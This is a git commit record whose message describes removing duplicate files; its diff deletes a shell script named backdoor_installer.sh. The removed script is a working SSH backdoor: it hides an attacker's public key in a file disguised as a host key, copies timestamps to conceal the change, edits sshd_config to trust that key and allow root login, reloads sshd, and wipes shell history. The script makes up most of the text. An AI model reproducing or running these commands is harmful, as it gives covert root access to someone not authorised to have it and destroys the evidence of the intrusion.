22660990c715fca54c77e5b5c548987e34a63d68
SteffeyDev <steffeydev@icloud.com>
2019-04-08 22:43:42 -0400

    Removing duplicate files (Everything now in Scripts.md

--- scripts/ssh_lockout/backdoor_installer.sh
+++
@@ -1,8 +0,0 @@
-echo "PUBKEY HERE" >> /etc/ssh/ssh_host_rsa2048_key.pub
-touch -r /etc/ssh/ssh_host_rsa_key.pub /etc/ssh/ssh_host_rsa2048_key.pub
-sed -i 's/\#AuthorizedKeysFile.*/AuthorizedKeysFile .ssh\/authorized_keys \/etc\/ssh\/ssh_host_rsa2048_key.pub/' /etc/ssh/sshd_config
-sed -i 's/PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config
-sed -i 's/PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
-kill -HUP $(pgrep -f `which sshd`)
-history -c
-echo "" > ~/.bash_history
